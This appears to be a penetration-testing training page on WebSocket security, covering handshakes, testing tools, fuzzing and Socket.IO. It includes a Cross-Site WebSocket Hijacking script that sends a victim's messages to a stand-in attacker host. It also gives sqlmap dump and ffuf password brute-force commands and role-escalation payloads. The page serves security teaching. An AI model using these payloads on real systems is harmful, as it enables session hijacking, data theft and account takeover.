---
layout: training-page
title: "WebSocket Security — Red Team Academy"
module: "Web Hacking"
tags:
  - websockets
  - cswsh
  - csrf
  - real-time
  - fuzzing
page_key: "web-websockets"
render_with_liquid: false
---

# WebSocket Security

WebSockets provide full-duplex communication over a single persistent connection, commonly used
  in chat applications, live dashboards, gaming, and financial platforms. Unlike HTTP, WebSocket
  connections are long-lived and bi-directional. Security testing requires different tooling and
  techniques than standard HTTP testing — traditional scanners often miss WebSocket vulnerabilities
  entirely.

## Tools

- doyensec/wsrepl — interactive WebSocket REPL for pentesters — `github.com/doyensec/wsrepl`
- PortSwigger/websocket-turbo-intruder — fuzz WebSockets with Python — `github.com/PortSwigger/websocket-turbo-intruder`
- snyk/socketsleuth — Burp extension for WebSocket pentesting — `github.com/snyk/socketsleuth`
- ws-harness.py — proxy WebSocket messages to HTTP for traditional tools
- Burp Suite — intercept and replay WebSocket messages natively in Proxy tab

## WebSocket Protocol

WebSockets start as a standard HTTP/1.1 request. The client sends an Upgrade request; if the
  server accepts, it responds with 101 Switching Protocols and the persistent WebSocket connection
  is established. All subsequent messages bypass HTTP — no headers, no verbs, just raw frames.

### Handshake Request

```
GET /chat HTTP/1.1
Host: example.com:80
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Cookie: session=abc123
```

### Handshake Response

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Note: the `Cookie` header in the handshake carries the user's session. If the
  handshake is not CSRF-protected, any origin can initiate a WebSocket connection using the
  victim's cookies — this is the Cross-Site WebSocket Hijacking attack.

## Cross-Site WebSocket Hijacking (CSWSH)

CSWSH occurs when a WebSocket handshake does not include a CSRF token or an origin check.
  Browsers automatically send cookies with the handshake request, so an attacker's page can
  open an authenticated WebSocket to the victim's application and read all messages.

```
<!-- Attacker's page — hosted on evil.com -->
<script>
  var ws = new WebSocket('wss://target.example.com/messages');

  ws.onopen = function(event) {
    // Authenticate or request sensitive data
    ws.send("GET_USER_DATA");
  };

  ws.onmessage = function(event) {
    // Exfiltrate all received messages to attacker server
    fetch('https://attacker.example.net/steal?data=' + encodeURIComponent(event.data),
          {mode: 'no-cors'});
  };
</script>
```

If the application uses a `Sec-WebSocket-Protocol` header in the handshake,
  pass it as the second argument:

```
<script>
  var ws = new WebSocket('wss://target.example.com/messages', 'chat-protocol');
</script>
```

## Using wsrepl for Auditing

wsrepl provides an interactive terminal for sending and receiving WebSocket messages during a
  pentest. It integrates with Burp by accepting curl-style arguments from the captured Upgrade
  request, and supports Python plugins for automation.

```
# Install wsrepl
pip install wsrepl

# Connect with authentication plugin
wsrepl -u wss://target.com/ws -P auth_plugin.py

# Use cookies from Burp (copy as curl, paste into wsrepl)
wsrepl -u wss://target.com/ws \
       -H "Cookie: session=abc123" \
       -H "Origin: https://target.com"
```

### wsrepl Plugin Example

```
from wsrepl import Plugin
from wsrepl.WSMessage import WSMessage
import json
import requests

class AuthPlugin(Plugin):
    def init(self):
        # Fetch auth token on startup
        token = requests.get("https://target.com/api/uuid").json()["uuid"]
        self.messages = [
            json.dumps({"type": "auth", "sessionId": token})
        ]

    async def on_message_sent(self, message: WSMessage) -> None:
        # Wrap outgoing messages in the app's expected format
        original = message.msg
        message.msg = json.dumps({"type": "message", "data": {"text": original}})
        message.short = original
        message.long = message.msg

    async def on_message_received(self, message: WSMessage) -> None:
        # Extract readable text from response frames
        try:
            message.short = json.loads(message.msg)["data"]["text"]
        except Exception:
            message.short = "Could not parse response"
        message.long = message.msg
```

## Fuzzing WebSockets via HTTP Proxy (ws-harness.py)

ws-harness.py acts as a bridge: it listens for HTTP requests, injects the request body into
  a WebSocket message (replacing the `[FUZZ]` keyword), and forwards the response
  back as HTTP. This allows standard fuzzing tools (sqlmap, ffuf, Burp Intruder) to work against
  WebSocket endpoints.

```
# Start the harness targeting the WebSocket endpoint:
python ws-harness.py -u "ws://target.com/authenticate-user" -m ./message.txt
```

message.txt template (contains the [FUZZ] placeholder):

```
{
    "auth_user": "dGVzdA==",
    "auth_pass": "[FUZZ]"
}
```

```
# Now run sqlmap against the harness HTTP endpoint:
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --tables --tamper=base64encode --dump

# Or use ffuf for credential brute-force:
ffuf -u http://127.0.0.1:8000/?fuzz=FUZZ -w /usr/share/wordlists/rockyou.txt
```

## SocketIO-Specific Testing

Socket.IO adds its own protocol on top of WebSockets (and falls back to long-polling).
  Messages follow a specific framing format with event names and data payloads. Intercept with
  Burp and look for event names that can be manipulated.

```
# Socket.IO message format (engine.io protocol):
# Type prefixes: 0=open, 1=close, 2=ping, 3=pong, 4=message, 5=upgrade, 6=noop
# Socket.IO message type 4 (send):
42["event_name",{"key":"value"}]

# Test for injection in event data:
42["send_message",{"room":"admin","text":"injected"}]
42["change_role",{"userid":"victim","role":"admin"}]
```

## Common Vulnerabilities to Test

- **CSWSH** — missing CSRF token or origin check on handshake
- **Injection in message body** — SQL injection, XSS, command injection via WebSocket message payloads
- **Authorization** — can lower-privilege users access high-privilege WebSocket events?
- **Message replay** — can old messages be replayed to re-trigger actions?
- **DoS via message flooding** — no rate limiting on WebSocket messages
- **Insecure protocol** — using `ws://` instead of `wss://` (plaintext, MitM)

## Resources

- PayloadsAllTheThings Web Sockets — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets`
- PortSwigger WebSocket vulnerabilities — `portswigger.net/web-security/websockets`
- wsrepl tool — `github.com/doyensec/wsrepl`
- Streamlining WebSocket Pentesting with wsrepl — Doyensec blog, July 2023
- websocket-turbo-intruder — `github.com/PortSwigger/websocket-turbo-intruder`
- socketsleuth Burp extension — `github.com/snyk/socketsleuth`
- Cross Site WebSocket Hijacking with socketio — Jimmy Li, 2020
- PortSwigger Labs — Cross-site WebSocket hijacking — `portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab`
- Root Me — Web Socket 0 protection challenge — `root-me.org/en/Challenges/Web-Client/Web-Socket-0-protection`
